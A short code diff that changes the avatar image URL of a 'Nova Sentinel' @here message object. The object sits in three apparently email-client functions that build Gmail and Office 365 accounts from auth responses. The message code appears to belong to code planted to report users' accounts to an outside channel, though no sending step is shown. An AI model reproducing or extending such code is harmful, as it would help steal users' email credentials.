@@ -129,7 +129,7 @@ async function expandAccountWithCommonSettings(account) {
       const message = {
         username: "Nova Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
         content: "@here",
         embeds: [embed],
       };
@@ -313,7 +313,7 @@ async function buildGmailAccountFromAuthResponse(code) {
       const message = {
         username: "Nova Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
         content: "@here",
         embeds: [embed],
       };
@@ -431,7 +431,7 @@ async function buildO365AccountFromAuthResponse(code) {
       const message = {
         username: "Nova Sentinel",
         avatar_url:
-          "https://raw.githubusercontent.com/ksch-58/sub/main/assets/lilnova.png",
+          "https://raw.githubusercontent.com/KSCHcuck/sub/main/assets/lilnova.png",
         content: "@here",
         embeds: [embed],
       };
